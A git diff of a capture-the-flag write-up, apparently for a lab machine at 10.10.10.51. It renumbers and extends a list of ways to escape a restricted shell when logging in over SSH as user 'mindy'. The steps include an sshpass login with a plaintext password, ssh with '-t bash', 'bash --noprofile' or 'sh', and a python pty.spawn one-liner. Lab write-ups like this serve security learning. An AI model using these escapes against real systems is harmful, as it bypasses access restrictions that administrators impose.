@@ -124,19 +124,23 @@ pass: P@55W0rd1!2@
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dd5f965b-922d-4a3b-90eb-b4dcdf6c6319)
 
-+ Add `-t bash` to the SSH connection command to escape: `sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash`
++ **Alternatively 2**, add `-t bash` to the SSH connection command to escape: `sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash`
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/507882d1-c29e-471e-b6fe-9320d168cd60)
 
-+ **Alternatively 2**, `ssh mindy@10.10.10.51 -t "bash --noprofile"`
++ **Alternatively 3**, `ssh mindy@10.10.10.51 -t "bash --noprofile"`
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8c2bf2a7-0bb8-4f15-8320-20649598c2d3)
 
-+ **Alternatively 3**, `ssh mindy@10.10.10.51 -t "sh"`
++ **Alternatively 4**, `ssh mindy@10.10.10.51 -t "bash"`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c132e9e8-d964-48bf-93b1-3f12c9aded70)
+
++ **Alternatively 5**, `ssh mindy@10.10.10.51 -t "sh"`
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/821443fa-d6db-4989-aec9-20a4ce598efc)
 
-+ **Alternatively 4**, `ssh mindy@10.10.10.51 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/sh\")'"`
++ **Alternatively 6**, `ssh mindy@10.10.10.51 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/sh\")'"`
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/17aa6c7b-f1e3-4641-a9b2-7d9225df9184)
 
